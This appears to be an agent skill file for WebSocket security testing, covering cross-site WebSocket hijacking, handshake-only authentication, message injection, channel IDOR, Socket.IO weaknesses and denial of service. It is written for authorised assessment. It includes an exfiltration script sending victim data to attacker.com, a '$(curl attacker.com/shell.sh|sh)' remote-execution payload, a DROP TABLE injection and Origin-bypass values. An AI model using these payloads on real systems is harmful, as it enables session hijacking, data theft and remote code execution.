---
name: websocket
description: WebSocket security testing covering Cross-Site WebSocket Hijacking, message injection, and authentication bypass
---

# WebSocket

Security testing for WebSocket endpoints. Focus on Cross-Site WebSocket Hijacking (CSWSH), message injection, handshake-only authentication bypass, Origin validation gaps, channel/room IDOR, and Socket.IO-specific weaknesses.

## Attack Surface

**Handshake**
- HTTP Upgrade request with `Sec-WebSocket-Key` / `Sec-WebSocket-Accept`
- Origin header validation (or lack thereof)
- Cookie/token forwarding during upgrade
- Subprotocol negotiation (`Sec-WebSocket-Protocol`)

**Transports**
- Native WebSocket (`ws://`, `wss://`)
- Socket.IO (HTTP long-polling fallback + upgrade to WS)
- SockJS, SignalR, ActionCable

**Message Framing**
- Text frames (JSON, XML, custom delimiters)
- Binary frames (protobuf, msgpack, custom serialization)
- Control frames: ping/pong, close (status codes 1000-4999)
- Fragmented messages across multiple frames

**Architecture**
- Pub/sub channels, rooms, namespaces (Socket.IO)
- Presence tracking and broadcast topology
- Load-balancer sticky sessions and reconnect behavior

## Reconnaissance

**Endpoint Discovery**
```
ws://target/ws
ws://target/socket
ws://target/websocket
ws://target/cable              # ActionCable
ws://target/socket.io/?EIO=4&transport=websocket  # Socket.IO
ws://target/signalr/connect    # SignalR
ws://target/hub                # SignalR
```

Inspect client-side JavaScript for `new WebSocket(`, `io(`, `io.connect(`, `SockJS(`, `HubConnectionBuilder`. Check network tab for upgrade requests. Search JS bundles for channel/room names and event types.

**Fingerprinting**
```
# Socket.IO handshake (returns session ID + transport config)
GET /socket.io/?EIO=4&transport=polling

# ActionCable handshake
{"command":"subscribe","identifier":"{\"channel\":\"TestChannel\"}"}

# Check supported subprotocols in server response
Sec-WebSocket-Protocol: graphql-ws, graphql-transport-ws
```

**Message Schema Mapping**
Connect and observe traffic. Catalog event names, message types, JSON structure, and enumerable fields. Identify which messages trigger server-side actions vs. read-only broadcasts.

## Key Vulnerabilities

### Cross-Site WebSocket Hijacking (CSWSH)

The WebSocket handshake is a regular HTTP request. Browsers attach cookies automatically. If the server does not validate the Origin header, an attacker page can open a WebSocket to the victim's authenticated session.

**Test:**
```html
<script>
  var ws = new WebSocket("wss://target.com/ws");
  ws.onopen = function() {
    ws.send(JSON.stringify({action: "get_profile"}));
  };
  ws.onmessage = function(e) {
    fetch("https://attacker.com/log?data=" + encodeURIComponent(e.data));
  };
</script>
```

Host this on `attacker.com`. If the victim visits it while authenticated to `target.com`, the WebSocket inherits their session cookies. Verify Origin header enforcement:
- Missing Origin check entirely
- Regex bypass: `evil-target.com`, `target.com.evil.com`
- Null Origin (sandboxed iframes)
- Case sensitivity: `Target.Com`

### Handshake-Only Authentication

Many implementations authenticate only during the HTTP upgrade handshake and never re-validate on subsequent messages. After the connection is established, the session runs indefinitely even if the user's session is revoked, role changes, or tokens expire.

**Test:**
1. Authenticate and establish WebSocket connection
2. Revoke the session/token via another channel
3. Continue sending privileged messages on the existing WebSocket
4. Verify the server still processes them

### Message Injection and Manipulation

**JSON Key Injection**
```json
{"action":"updateProfile","name":"test","role":"admin"}
{"action":"sendMessage","to":"user1","__proto__":{"isAdmin":true}}
```

**Type Confusion**
```json
{"id": 1}        vs  {"id": "1"}
{"id": [1]}      vs  {"id": {"$gt": 0}}
{"amount": 100}  vs  {"amount": -100}
```

**Command Injection via Message Fields**
If message content is reflected in server-side operations (logging, database queries, system commands), inject payloads:
```json
{"action":"search","query":"'; DROP TABLE users;--"}
{"action":"exec","cmd":"$(curl attacker.com/shell.sh|sh)"}
```

### Channel/Room IDOR

**Subscribe to Foreign Channels**
```json
{"action":"subscribe","channel":"user_12345_private"}
{"action":"join","room":"admin-dashboard"}
{"command":"subscribe","identifier":"{\"channel\":\"PrivateChannel\",\"user_id\":999}"}
```

Enumerate channel/room naming patterns. Test whether authorization is enforced per-subscription or only at the namespace level.

**Broadcast Leakage**
Subscribe to a wildcard or parent channel and observe whether messages from child/private channels leak through.

### Socket.IO Specific Attacks

**Namespace Traversal**
```javascript
// Connect to admin namespace without privileges
const socket = io("https://target.com/admin");

// Event enumeration
socket.onAny((event, ...args) => console.log(event, args));
```

**EIO Version Downgrade**
Force `EIO=3` instead of `EIO=4` to exploit older protocol parsing. Older versions may lack CSRF protections or have different serialization.

**Binary Attachment Abuse**
Socket.IO separates binary attachments. Manipulate `_placeholder` references to inject or swap binary payloads between messages.

### Denial of Service

- Send maximum-size frames (no server-side `maxPayload` limit)
- Open many concurrent connections from one origin
- Send rapid ping frames to overwhelm keepalive logic
- Fragment messages with no final frame (incomplete message)
- Slowloris-style: keep connection open, send data byte-by-byte

## Bypass Techniques

**Origin Header Manipulation**
```
Origin: https://target.com            # Legitimate
Origin: https://target.com.evil.com   # Subdomain trick
Origin: https://evil-target.com       # Hyphen bypass
Origin: null                          # Sandboxed iframe
```

**Token Smuggling**
If WebSocket does not support Authorization headers natively:
- Token in URL query parameter: `wss://target.com/ws?token=JWT`
- Token in first message after connection
- Token in subprotocol header: `Sec-WebSocket-Protocol: token.eyJhbG...`

**Reconnect Race Condition**
Rapidly disconnect and reconnect to inherit stale session state or bypass per-connection rate limits. Some implementations cache auth state across reconnects.

**Protocol Downgrade**
Force fallback from `wss://` to `ws://` via MITM or proxy misconfiguration to intercept cleartext traffic.

## Testing Methodology

1. **Discover** - Identify WebSocket endpoints via JS analysis, network interception, common path probing
2. **Handshake analysis** - Capture upgrade request; note cookies, tokens, Origin handling, subprotocols
3. **CSWSH test** - Host attacker page, verify cross-origin WebSocket with victim cookies
4. **Auth persistence** - Revoke session, confirm messages still processed on existing connection
5. **Message fuzzing** - Inject unexpected types, extra fields, boundary values in each message action
6. **Channel enumeration** - Subscribe to foreign channels/rooms, test naming pattern brute-force
7. **Privilege escalation** - Send admin-level actions on user-level connections
8. **DoS assessment** - Test frame size limits, connection limits, fragmentation handling

## Validation Requirements

- CSWSH proof: attacker-hosted page successfully reads authenticated WebSocket data cross-origin
- Session persistence: messages accepted after token/session revocation with timestamps
- Channel IDOR: subscription to foreign user's private channel with captured broadcast data
- Message injection: server-side effect from injected fields (role escalation, data modification)
- Paired requests showing privileged vs unprivileged message handling differences

## False Positives

- WebSocket connections that use per-message token validation (not just handshake cookies)
- Channels with public broadcast data that appears private but is intentionally open
- Rate limiting applied at infrastructure level (load balancer) not visible in application responses
- Origin validation delegated to a reverse proxy rather than the application layer

## Impact

- **CSWSH**: Full account takeover equivalent; attacker reads/writes on victim's authenticated session
- **Channel IDOR**: Unauthorized access to private messages, notifications, real-time data streams
- **Handshake-only auth**: Indefinite session persistence after credential revocation
- **Message injection**: Server-side command execution, data manipulation, privilege escalation

## Pro Tips

- Use `websocat` for CLI-based WebSocket testing: `websocat wss://target.com/ws -H "Cookie: session=abc"`
- Burp Suite's WebSocket history and Repeater support interception and replay of individual frames
- For Socket.IO, use the `socket.io-client` npm package in a Node.js script for full protocol control
- Monitor for `close` frames with non-standard status codes (4000-4999) that may leak internal error details
- Check if the server echoes back message IDs or sequence numbers that can be predicted or replayed
- Test WebSocket behind CDNs (Cloudflare, AWS ALB) as they may strip or modify headers differently

## Summary

WebSocket security hinges on three pillars: Origin validation during handshake, per-message authorization enforcement, and channel/room access control. CSWSH is the highest-impact vulnerability since browsers automatically attach cookies to the upgrade request. Always verify that authentication is not limited to the handshake alone and that channel subscriptions enforce per-user authorization. Socket.IO and similar frameworks add their own attack surface through namespaces, event routing, and transport fallback mechanisms.
